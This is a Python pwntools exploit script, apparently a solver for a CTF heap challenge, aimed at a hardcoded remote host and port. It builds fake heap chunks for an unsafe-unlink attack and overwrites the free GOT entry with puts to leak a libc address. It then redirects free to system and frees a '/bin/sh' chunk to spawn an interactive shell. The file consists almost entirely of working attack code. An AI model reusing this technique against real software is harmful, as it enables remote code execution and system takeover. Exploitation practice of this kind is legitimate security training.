from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "106.75.27.104"
remote_port = 50514

local_addr = "127.0.0.1"
local_port = 1807

pc = "./pwn"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x400a6f\n b*0x400c4b\n b*0x400cdd')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def show():
	sla('choice:','1')

def add(size,name):
	sla('choice:','2')
	sla('name:',str(size))
	sla('servant:',name)

def change(idx,size,name):
	sla('choice:','3')
	sla('servant:',str(idx))
	sla('name:',str(size))
	sla('servnat:',name)

def delete(idx):
	sla('choice:','4')
	sla('servant:',str(idx))

def hack():
	#raw_input()
	heap_list = 0x6020c0
	secret_addr = 0x400d6a
	puts_got = pwn_elf.got['puts']
	exit_got = pwn_elf.got['exit']
	free_got = pwn_elf.got['free']
	
	puts_plt = 0x4006e6
	add(0x88,'a')		#0
	add(0x88,'a')		#1
	add(0x88,'a')		#2
	add(0x88,'a')		#3

	add(0x88,'a')		#4
	add(0x88,'a')		#5
	add(0x88,'/bin/sh')		#6
	

	fake_fd = heap_list + 0x18 - 0x18
	fake_bk = heap_list + 0x18 - 0x10
	payload = p64(0) + p64(0x81)
	payload += p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x80,'\x00')
	payload += p64(0x80) + p64(0x90)
	change(1,0x110,payload)
	delete(2)


	fake_fd = heap_list + 0x48 - 0x18
	fake_bk = heap_list + 0x48 - 0x10
	payload = p64(0) + p64(0x81)
	payload += p64(fake_fd) + p64(fake_bk)
	payload = payload.ljust(0x80,'\x00')
	payload += p64(0x80) + p64(0x90)
	change(4,0x110,payload)
	delete(5)

	# add(0x70,'a')
	# show()
	# ru('2 : ')
	# libc.address = u64(rv(6).ljust(8,'\x00')) - 0x58
	# lg('libc',libc.address)

	payload = p64(0)+ p64(puts_got) + p64(0) + p64(free_got)
	change(1,0x20,payload)

	payload = p64(puts_plt) + p64(puts_plt)
	change(1,0x10,payload)

	delete(0)
	puts_addr = u64(rv(6).ljust(8,'\x00'))
	lg('puts_addr',puts_addr)
	libc.address = puts_addr - 0x000000000006f690
	system_addr = libc.address + 0x0000000000045390

	payload = p64(0) + p64(puts_got) + p64(0) + p64(free_got)
	change(4,0x20,payload)
	payload = p64(system_addr) + p64(puts_plt)
	change(4,0x10,payload)
	
	delete(6)
	#sla('choice:','5')
	p.interactive()
hack()